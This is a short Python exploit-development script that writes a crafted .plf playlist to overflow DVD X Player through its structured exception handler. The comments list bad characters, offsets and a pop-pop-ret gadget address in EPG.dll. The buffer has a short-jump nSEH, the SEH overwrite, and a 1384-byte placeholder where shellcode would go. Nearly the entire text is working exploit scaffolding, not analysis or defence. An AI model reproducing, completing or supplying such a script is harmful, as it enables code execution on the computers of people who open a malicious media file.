#!/usr/bin/python -w

filename="dvdxplayer_patt_nSEH.plf"

#---------------------------------------------------------------------------#
# (*) badchars = '\x00\x0A\x0D\x1A'                                         #
#                                                                           #
# offset to: (2) nseh 608-bytes, (1) seh 112-bytes                          #
# (2) nseh = ????                                                           #
# (1) seh = 0x61617619 : pop esi # pop edi # ret  | EPG.dll                 #
# (3) shellcode space = 1384-bytes                                          #
#---------------------------------------------------------------------------#

buffer = "A"*608 + "\xEB\x06\x90\x90" + "\x19\x76\x61\x61" + "D"*1384

textfile = open(filename, 'w')
textfile.write(buffer)
textfile.close()
